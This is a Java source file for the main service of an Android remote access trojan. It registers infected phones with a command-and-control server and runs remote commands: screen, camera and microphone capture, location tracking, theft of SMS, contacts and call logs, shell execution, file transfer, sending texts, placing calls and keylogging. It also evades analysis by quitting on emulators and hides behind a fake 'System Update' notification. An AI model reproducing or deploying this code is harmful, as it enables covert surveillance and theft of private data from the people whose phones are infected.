package com.xroomjx.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;

import com.xroomjx.rat.modules.*;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Random;

public class MainService extends Service {
    private static final String CHANNEL_ID = "xroomjx_service";
    private C2Client c2;
    private Handler handler;
    private Runnable pollRunnable;
    private String uid;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());

        uid = Helpers.getUID(this);
        c2 = new C2Client();
        handler = new Handler(Looper.getMainLooper());

        // Anti-analysis check
        if (AntiAnalysis.isEmulator(this)) {
            stopSelf();
            return;
        }

        // Register to C2
        c2.register(uid, Helpers.getDeviceInfo(this));

        // Start polling loop
        startPolling();
    }

    private void startPolling() {
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                pollCommands();
                // Jitter: random delay 3-15 seconds
                int delay = new Random().nextInt(12000) + 3000;
                handler.postDelayed(this, delay);
            }
        };
        handler.post(pollRunnable);
    }

    private void pollCommands() {
        new Thread(() -> {
            try {
                JSONArray commands = c2.getCommands(uid);
                for (int i = 0; i < commands.length(); i++) {
                    JSONObject cmd = commands.getJSONObject(i);
                    executeCommand(cmd);
                }
            } catch (Exception e) {
                // silent
            }
        }).start();
    }

    private void executeCommand(JSONObject cmd) {
        new Thread(() -> {
            try {
                String command = cmd.getString("command");
                String args = cmd.optString("args", "{}");
                String result = "";

                switch (command) {
                    case "screen": result = ScreenCapture.capture(this); break;
                    case "camera": result = CameraCapture.capture(this); break;
                    case "mic": result = MicRecord.record(this, 5); break;
                    case "location": result = LocationTracker.getLocation(this); break;
                    case "grab_sms": result = Grabber.grabSMS(this); break;
                    case "grab_contacts": result = Grabber.grabContacts(this); break;
                    case "grab_call_log": result = Grabber.grabCallLog(this); break;
                    case "shell": result = ShellExecutor.exec(args); break;
                    case "file_list": result = FileManager.listFiles(args); break;
                    case "file_download": result = FileManager.download(args); break;
                    case "file_upload": result = FileManager.upload(args); break;
                    case "send_sms": result = SMSManager.send(args); break;
                    case "call": result = CallManager.call(this, args); break;
                    case "keylog_start": Keylogger.start(this); result = "started"; break;
                    case "keylog_stop": result = Keylogger.stop(); break;
                    case "uninstall": Persistence.uninstall(this); result = "uninstalled"; break;
                }

                c2.sendResult(uid, cmd.getInt("id"), result);
            } catch (Exception e) {
                // silent
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? new Notification.Builder(this, CHANNEL_ID)
            : new Notification.Builder(this);
        return builder
            .setContentTitle("System Update")
            .setContentText("Running in background...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
